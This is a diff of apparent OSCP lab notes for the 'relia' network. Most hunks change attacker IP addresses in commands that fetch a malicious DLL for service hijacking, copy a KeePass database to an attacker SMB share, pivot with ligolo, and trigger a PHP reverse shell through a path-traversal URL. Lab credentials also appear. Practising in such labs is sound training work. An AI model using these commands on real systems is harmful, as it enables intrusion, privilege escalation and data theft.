@@ -270,7 +270,7 @@ PS C:\Windows\system32>
 
 6. Upload in scheduler folder.  Restart service and user rogue will be added. 
 ```
-iwr -uri http://192.168.45.242:800/myDLL.dll -Outfile C:\scheduler\beyondhelper.dll
+iwr -uri http://192.168.45.202:80/myDLL.dll -Outfile C:\scheduler\beyondhelper.dll
 
 Restart-Service Schduler 
 ```
@@ -550,7 +550,7 @@ sarah@backup:/$ find / -writable -type d 2>/dev/null
 
 6. Check on background processes with pspy64 to see how backup is going on. Transfer file. 
 ```
-sarah@backup:/tmp$ wget http://192.168.45.242/pspy64
+sarah@backup:/tmp$ wget http://192.168.45.202/pspy64
 --2024-02-17 10:19:00--  http://192.168.45.242/pspy64
 Connecting to 192.168.45.242:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -663,7 +663,7 @@ Nmap done: 1 IP address (1 host up) scanned in 182.21 seconds
 2. Obtained creds from machine 19 and using it to ssh login. 
 ```
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
-└─$ proxychains ssh andrew@172.16.99.2
+└─$ proxychains ssh andrew@172.16.181.20
 
 $ whoami
 andrew:Rb9kNokjDsjYyH
@@ -1066,7 +1066,7 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 └─$  python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare . 
 Impacket v0.11.0 - Copyright 2023 Fortra
 
-PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.172\myshare\Database.kdbx
+PS C:\> copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.202\myshare\Database.kdbx
 copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.172\myshare\Database.kdbx
 
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
@@ -1206,6 +1206,8 @@ Nmap done: 1 IP address (1 host up) scanned in 74.10 seconds
 └─$ xfreerdp /cert-ignore /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.194.191
 
 559557270c4cdcdaddb6e6401bc2aae5
+
+
 ```
 
 3. Establish ligolong conection from here to internal network
@@ -1232,7 +1234,7 @@ time="2024-02-16T15:24:11-08:00" level=warning msg="warning, certificate validat
 time="2024-02-16T15:24:11-08:00" level=info msg="Connection established" addr="192.168.45.242:11601"
 
 
-
+michelle creds from kerberoasting 
 ```
 ## 245
 1. Rustscan and Nmap scans
@@ -1729,6 +1731,7 @@ php-reverse-shell.php
 anita@demo:/dev/shm$ ls
 php-reverse-shell.php
 
+http://192.168.45.202:1080/backend/?view=../../../../../dev/shm/shell.php
 
 ┌──(kali㉿kali)-[~/OSCP/labs/relia]
 └─$ sudo nc -nvlp 1234                             
